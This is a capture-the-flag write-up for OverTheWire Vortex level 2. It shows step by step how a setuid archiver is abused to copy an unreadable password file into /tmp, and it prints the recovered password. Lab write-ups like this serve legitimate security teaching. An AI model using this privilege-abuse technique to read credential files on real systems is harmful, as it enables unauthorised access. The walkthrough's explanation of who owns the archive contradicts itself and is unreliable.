# Vortex Level 2 → 3

## Goal

`vortex2` is a setuid archiver — it takes a filename, creates a tar archive that includes that file, and drops the archive in `/tmp`. Because it runs as `vortex3` it can archive files *you* can't read (like `/etc/vortex_pass/vortex3`). Archive the password file; extract the archive as yourself; read the password out.

## Concepts you'll learn

- Abusing a **privileged archiver** as a read primitive — the archive reflects the file's contents, and you own the archive
- The recurring idea that a privileged binary that *touches* a file you can't read is essentially a read oracle
- `tar xvf` to extract an archive once you own it

## Walkthrough

### 1. Understand the binary

```bash
$ ls -l /vortex/vortex2
-r-sr-x--- 1 vortex3 vortex2 ... /vortex/vortex2

$ /vortex/vortex2
Usage: /vortex/vortex2 <filename>
```

Setuid `vortex3`. Runs from whatever directory you're in, archives the file you name relative to cwd.

### 2. Run it from `/etc/vortex_pass/` targeting `vortex3`

```bash
$ cd /etc/vortex_pass/
$ /vortex/vortex2 vortex3
```

The binary, running as `vortex3`, reads `vortex3` in the current directory (`/etc/vortex_pass/vortex3` — the password file for the next level), and creates a tar archive in `/tmp` named something like `ownership.<pid>.tar`.

### 3. Extract the archive

```bash
$ ls /tmp/ownership.*.tar
/tmp/ownership.12345.tar

$ cd /tmp
$ tar xvf ownership.12345.tar
vortex3

$ cat vortex3
YAVzRBMI4
```

You couldn't read `/etc/vortex_pass/vortex3` directly, but the archive `/tmp/ownership.xxx.tar` is yours (owned by `vortex2`, your current user) because `tar` creates it with your credentials. Inside the archive, the file contents are intact.

### 4. Log in as vortex3

```bash
$ ssh vortex3@vortex.labs.overthewire.org -p 5842
```

## The answer

The password for `vortex3` is:

**`YAVzRBMI4`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex2.html>
